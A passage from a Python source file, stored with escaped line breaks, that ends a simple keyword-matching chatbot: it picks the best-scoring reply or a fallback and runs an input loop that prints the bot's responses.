print(highest_prob_list)\r\n    # print(f'Best match = {best_match} | Score: {highest_prob_list[best_match]}')\r\n\r\n    return long.unknown() if highest_prob_list[best_match] < 1 else best_match\r\n\r\n\r\n# Used to get the response\r\ndef get_response(user_input):\r\n    split_message = re.split(r'\\s+|[,;?!.-]\\s*', user_input.lower())\r\n    response = check_all_messages(split_message)\r\n    return response\r\n\r\n\r\n# Testing the response system\r\nwhile True:\r\n    print('Bot: ' + get_response(input('You: ')))"
]